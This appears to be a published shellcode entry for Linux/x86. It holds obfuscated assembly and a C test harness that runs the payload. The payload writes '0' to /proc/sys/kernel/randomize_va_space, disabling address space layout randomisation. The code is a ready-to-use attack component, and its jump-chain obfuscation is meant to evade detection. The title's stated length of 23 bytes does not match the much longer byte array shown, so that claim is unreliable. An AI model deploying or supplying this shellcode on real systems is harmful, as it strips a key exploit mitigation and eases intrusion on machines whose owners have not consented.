;Title   : Linux/x86 - Disable ASLR Security obfuscated shellcode - 23 bytes
;Date    : 24 Jan 2018
;Author  : 0xAlaufi <m.alaufi@protonmail.com>
;Tested on  : Linux/x86 (Ubuntu 12.04.5)

global _start
section .text
_start:

jmp	zero2
zero18:
	mov al,0x4
	jmp	zero19
zero1a:
	mov al,0x6
	jmp	zero1b
zeroc:
	push 0x72702f2f
	jmp	zerod
zero12:
	push eax
	jmp	zero13
zero1b:
	int 0x80
	jmp	zero1c
zero1c:
	inc eax
	jmp	zero1d
zerod:
	mov ebx,esp
	jmp	zeroe
zero16:
	xor edx,edx
	jmp	zero17
zero5:
	push 0x735f6176
	jmp	zero6
zero19:
	int 0x80
	jmp	zero1a
zero7:
	push 0x6d6f646e
	jmp	zero8
zeroa:
	push 0x6b2f7379
	jmp	zerob
zero13:
	mov dx,0x3a30
	jmp	zero14
zero10:
	int 0x80
	jmp	zero11
zerob:
	push 0x732f636f
	jmp	zeroc
zero14:
	push dx
	jmp	zero15
zero4:
	push 0x65636170
	jmp	zero5
zero8:
	push 0x61722f6c
	jmp	zero9
zero9:
	push 0x656e7265
	jmp	zeroa
zero15:
	mov ecx,esp
	jmp	zero16
zero11:
	mov ebx,eax
	jmp	zero12
zero6:
	push 0x5f657a69
	jmp	zero7
zero2:
	xor eax,eax
	jmp	zero3
zero3:
	push eax
	jmp	zero4
zerof:
	mov al,0x8
	jmp	zero10
zeroe:
	mov cx,0x2bc
	jmp	zerof
zero17:
	inc edx
	jmp	zero18
zero1d:
	int 0x80
	jmp	zero1e
zero1e:


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x73\xb0\x04\xeb\x24\xb0\x06\xeb\x0a\x68\x2f\x2f\x70\x72\xeb\x0a\x50\xeb\x28\xcd\x80\xeb\x00\x40\xeb\x71\x89\xe3\xeb\x61\x31\xd2\xeb\x63\x68\x76\x61\x5f\x73\xeb\x44\xcd\x80\xeb\xd8\x68\x6e\x64\x6f\x6d\xeb\x23\x68\x79\x73\x2f\x6b\xeb\x0a\x66\xba\x30\x3a\xeb\x0b\xcd\x80\xeb\x24\x68\x6f\x63\x2f\x73\xeb\xbd\x66\x52\xeb\x15\x68\x70\x61\x63\x65\xeb\xcb\x68\x6c\x2f\x72\x61\xeb\x00\x68\x65\x72\x6e\x65\xeb\xcf\x89\xe1\xeb\xb5\x89\xc3\xeb\xa3\x68\x69\x7a\x65\x5f\xeb\xb9\x31\xc0\xeb\x00\x50\xeb\xd5\xb0\x08\xeb\xc2\x66\xb9\xbc\x02\xeb\xf6\x42\xe9\x76\xff\xff\xff\xcd\x80\xeb\x00";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}